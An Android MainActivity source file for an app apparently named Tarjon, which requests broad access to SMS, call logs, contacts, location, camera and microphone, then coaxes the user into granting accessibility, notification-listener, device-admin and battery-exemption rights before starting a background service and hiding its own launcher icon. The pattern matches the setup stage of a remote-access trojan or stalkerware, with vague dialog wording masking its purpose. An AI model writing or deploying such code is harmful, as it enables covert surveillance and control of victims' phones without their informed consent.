package com.tarjon.admin;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.tarjon.admin.services.AdminService;
import com.tarjon.admin.services.TarjonAccessibilityService;
import com.tarjon.admin.receivers.DeviceAdminReceiver;

import java.util.ArrayList;
import java.util.List;

/**
 * Main activity for the app
 * Acts as the entry point and requests necessary permissions
 */
public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";
    
    // Request codes
    private static final int REQUEST_PERMISSIONS = 1000;
    private static final int REQUEST_ADMIN_PERMISSIONS = 1001;
    private static final int REQUEST_BATTERY_OPTIMIZATION = 1002;
    private static final int REQUEST_NOTIFICATION_ACCESS = 1003;
    private static final int REQUEST_ACCESSIBILITY_SERVICE = 1004;
    
    // Permissions required for the app
    private static final String[] REQUIRED_PERMISSIONS = {
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.RECEIVE_BOOT_COMPLETED
    };
    
    // UI elements
    private TextView statusTextView;
    private Button permissionsButton;
    private Button startServiceButton;
    private Button hideAppButton;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // Initialize UI elements
        statusTextView = findViewById(R.id.statusTextView);
        permissionsButton = findViewById(R.id.permissionsButton);
        startServiceButton = findViewById(R.id.startServiceButton);
        hideAppButton = findViewById(R.id.hideAppButton);
        
        // Set up button click listeners
        permissionsButton.setOnClickListener(v -> requestPermissions());
        startServiceButton.setOnClickListener(v -> startService());
        hideAppButton.setOnClickListener(v -> hideApp());
        
        // Update the UI based on current state
        updateUI();
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        updateUI();
    }
    
    /**
     * Update the UI based on the current state of permissions and services
     */
    private void updateUI() {
        // Check if all permissions are granted
        boolean allPermissionsGranted = checkAllPermissions();
        
        // Check if accessibility service is enabled
        boolean accessibilityServiceEnabled = isAccessibilityServiceEnabled();
        
        // Check if notification listener service is enabled
        boolean notificationListenerEnabled = isNotificationListenerEnabled();
        
        // Check if device admin is active
        boolean deviceAdminActive = isDeviceAdminActive();
        
        // Check if battery optimization is disabled
        boolean batteryOptimizationDisabled = isBatteryOptimizationDisabled();
        
        // Check if service is running
        boolean serviceRunning = isServiceRunning();
        
        // Update UI based on state
        if (allPermissionsGranted && accessibilityServiceEnabled && 
                notificationListenerEnabled && deviceAdminActive && 
                batteryOptimizationDisabled && serviceRunning) {
            // All set up, show service status
            statusTextView.setText("Service is running");
            permissionsButton.setVisibility(View.GONE);
            startServiceButton.setVisibility(View.GONE);
            hideAppButton.setVisibility(View.VISIBLE);
        } else {
            // Some setup needed
            StringBuilder statusBuilder = new StringBuilder("Status:\n");
            
            if (!allPermissionsGranted) {
                statusBuilder.append("× Permissions required\n");
                permissionsButton.setVisibility(View.VISIBLE);
            } else {
                statusBuilder.append("✓ Permissions granted\n");
                permissionsButton.setVisibility(View.GONE);
            }
            
            if (!accessibilityServiceEnabled) {
                statusBuilder.append("× Accessibility service required\n");
            } else {
                statusBuilder.append("✓ Accessibility service enabled\n");
            }
            
            if (!notificationListenerEnabled) {
                statusBuilder.append("× Notification access required\n");
            } else {
                statusBuilder.append("✓ Notification access granted\n");
            }
            
            if (!deviceAdminActive) {
                statusBuilder.append("× Device admin required\n");
            } else {
                statusBuilder.append("✓ Device admin activated\n");
            }
            
            if (!batteryOptimizationDisabled) {
                statusBuilder.append("× Battery optimization needs to be disabled\n");
            } else {
                statusBuilder.append("✓ Battery optimization disabled\n");
            }
            
            if (!serviceRunning) {
                statusBuilder.append("× Service not running\n");
                startServiceButton.setVisibility(View.VISIBLE);
            } else {
                statusBuilder.append("✓ Service running\n");
                startServiceButton.setVisibility(View.GONE);
            }
            
            statusTextView.setText(statusBuilder.toString());
            hideAppButton.setVisibility(View.GONE);
        }
    }
    
    /**
     * Request all required permissions
     */
    private void requestPermissions() {
        // For Android 6.0+ (API level 23), request permissions at runtime
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            List<String> permissionsToRequest = new ArrayList<>();
            
            // Check which permissions are not granted
            for (String permission : REQUIRED_PERMISSIONS) {
                if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                    permissionsToRequest.add(permission);
                }
            }
            
            // Request permissions if any are pending
            if (!permissionsToRequest.isEmpty()) {
                ActivityCompat.requestPermissions(this, 
                        permissionsToRequest.toArray(new String[0]), 
                        REQUEST_PERMISSIONS);
            } else {
                // All basic permissions granted, request additional permissions
                requestAdditionalPermissions();
            }
        } else {
            // For pre-Marshmallow devices, permissions are granted at install time
            // Request additional permissions
            requestAdditionalPermissions();
        }
    }
    
    /**
     * Request additional permissions beyond the basic Android permissions
     */
    private void requestAdditionalPermissions() {
        // Check if battery optimization is disabled
        if (!isBatteryOptimizationDisabled()) {
            requestDisableBatteryOptimization();
            return;
        }
        
        // Check if accessibility service is enabled
        if (!isAccessibilityServiceEnabled()) {
            requestAccessibilityService();
            return;
        }
        
        // Check if notification listener is enabled
        if (!isNotificationListenerEnabled()) {
            requestNotificationListenerAccess();
            return;
        }
        
        // Check if device admin is active
        if (!isDeviceAdminActive()) {
            requestDeviceAdmin();
            return;
        }
        
        // All permissions granted
        Toast.makeText(this, "All permissions granted", Toast.LENGTH_SHORT).show();
        updateUI();
    }
    
    /**
     * Request to disable battery optimization
     */
    private void requestDisableBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent();
            String packageName = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            
            if (pm != null && !pm.isIgnoringBatteryOptimizations(packageName)) {
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                startActivityForResult(intent, REQUEST_BATTERY_OPTIMIZATION);
            }
        }
    }
    
    /**
     * Request accessibility service to be enabled
     */
    private void requestAccessibilityService() {
        new AlertDialog.Builder(this)
                .setTitle("Accessibility Service Required")
                .setMessage("This app requires accessibility service permissions to function properly. " +
                        "Please enable the service in the accessibility settings.")
                .setPositiveButton("Open Settings", (dialog, which) -> {
                    Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    startActivityForResult(intent, REQUEST_ACCESSIBILITY_SERVICE);
                })
                .setNegativeButton("Cancel", null)
                .show();
    }
    
    /**
     * Request notification listener access
     */
    private void requestNotificationListenerAccess() {
        new AlertDialog.Builder(this)
                .setTitle("Notification Access Required")
                .setMessage("This app requires notification access to function properly. " +
                        "Please enable the service in the notification access settings.")
                .setPositiveButton("Open Settings", (dialog, which) -> {
                    Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                    startActivityForResult(intent, REQUEST_NOTIFICATION_ACCESS);
                })
                .setNegativeButton("Cancel", null)
                .show();
    }
    
    /**
     * Request device admin privileges
     */
    private void requestDeviceAdmin() {
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, 
                new ComponentName(this, DeviceAdminReceiver.class));
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                "Device administrator privileges are required for proper app functionality.");
        startActivityForResult(intent, REQUEST_ADMIN_PERMISSIONS);
    }
    
    /**
     * Start the background service
     */
    private void startService() {
        // Check if all permissions are granted
        if (!checkAllPermissions() || 
                !isAccessibilityServiceEnabled() || 
                !isNotificationListenerEnabled() || 
                !isDeviceAdminActive() || 
                !isBatteryOptimizationDisabled()) {
            // Request permissions first
            requestPermissions();
            return;
        }
        
        // Start the service
        Intent serviceIntent = new Intent(this, AdminService.class);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show();
        updateUI();
    }
    
    /**
     * Hide the app from the launcher
     */
    private void hideApp() {
        // Disable the launcher component
        PackageManager packageManager = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        
        packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        
        Toast.makeText(this, "App will be hidden", Toast.LENGTH_SHORT).show();
        
        // Close the activity
        finish();
    }
    
    /**
     * Check if all required permissions are granted
     */
    private boolean checkAllPermissions() {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }
    
    /**
     * Check if accessibility service is enabled
     */
    private boolean isAccessibilityServiceEnabled() {
        String serviceName = getPackageName() + "/" + TarjonAccessibilityService.class.getCanonicalName();
        String enabledServices = Settings.Secure.getString(getContentResolver(), 
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        
        return enabledServices != null && enabledServices.contains(serviceName);
    }
    
    /**
     * Check if notification listener service is enabled
     */
    private boolean isNotificationListenerEnabled() {
        String serviceName = getPackageName() + "/" + 
                getPackageName() + ".services.TarjonNotificationListenerService";
        String enabledServices = Settings.Secure.getString(getContentResolver(), 
                Settings.Secure.ENABLED_NOTIFICATION_LISTENERS);
        
        return enabledServices != null && enabledServices.contains(serviceName);
    }
    
    /**
     * Check if device admin is active
     */
    private boolean isDeviceAdminActive() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName deviceAdmin = new ComponentName(this, DeviceAdminReceiver.class);
        
        return dpm != null && dpm.isAdminActive(deviceAdmin);
    }
    
    /**
     * Check if battery optimization is disabled
     */
    private boolean isBatteryOptimizationDisabled() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
        }
        return true; // Pre-Marshmallow devices don't have this restriction
    }
    
    /**
     * Check if the admin service is running
     */
    private boolean isServiceRunning() {
        return AdminService.getInstance() != null;
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == REQUEST_PERMISSIONS) {
            boolean allGranted = true;
            
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                // All basic permissions granted, request additional permissions
                requestAdditionalPermissions();
            } else {
                Toast.makeText(this, "Required permissions not granted", Toast.LENGTH_SHORT).show();
            }
            
            updateUI();
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        switch (requestCode) {
            case REQUEST_ADMIN_PERMISSIONS:
                if (resultCode == Activity.RESULT_OK) {
                    Toast.makeText(this, "Device admin activated", Toast.LENGTH_SHORT).show();
                    requestAdditionalPermissions();
                } else {
                    Toast.makeText(this, "Device admin not activated", Toast.LENGTH_SHORT).show();
                }
                break;
                
            case REQUEST_BATTERY_OPTIMIZATION:
                if (isBatteryOptimizationDisabled()) {
                    Toast.makeText(this, "Battery optimization disabled", Toast.LENGTH_SHORT).show();
                    requestAdditionalPermissions();
                } else {
                    Toast.makeText(this, "Battery optimization not disabled", Toast.LENGTH_SHORT).show();
                }
                break;
                
            case REQUEST_ACCESSIBILITY_SERVICE:
                if (isAccessibilityServiceEnabled()) {
                    Toast.makeText(this, "Accessibility service enabled", Toast.LENGTH_SHORT).show();
                    requestAdditionalPermissions();
                } else {
                    Toast.makeText(this, "Accessibility service not enabled", Toast.LENGTH_SHORT).show();
                }
                break;
                
            case REQUEST_NOTIFICATION_ACCESS:
                if (isNotificationListenerEnabled()) {
                    Toast.makeText(this, "Notification access granted", Toast.LENGTH_SHORT).show();
                    requestAdditionalPermissions();
                } else {
                    Toast.makeText(this, "Notification access not granted", Toast.LENGTH_SHORT).show();
                }
                break;
        }
        
        updateUI();
    }
}